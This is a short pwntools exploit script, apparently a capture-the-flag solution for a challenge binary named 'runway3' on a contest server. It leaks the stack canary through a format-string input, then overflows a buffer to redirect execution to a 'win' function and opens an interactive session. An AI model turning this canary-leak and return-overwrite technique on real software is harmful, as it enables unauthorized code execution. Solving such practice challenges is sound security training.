#!/usr/bin/env python3

from pwn import *

exe = ELF("./runway3")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13403)

    return r


def main():
    r = conn()

    # Leak the canary
    r.sendlineafter(b'here?\n', b'%13$p')
    canary = p64(int(r.recvline().strip().decode(), 16))
    log.info(f"{canary=}")

    # buf overflow
    r.sendline(
        b'A' * 0x28 + 
        canary + 
        b'A' * 8 + # Arbitrary saved rbp
        p64(0x4012bb) + # [ret] gadget for stack alignment
        p64(exe.symbols.win)
    )

    r.interactive()


if __name__ == "__main__":
    main()
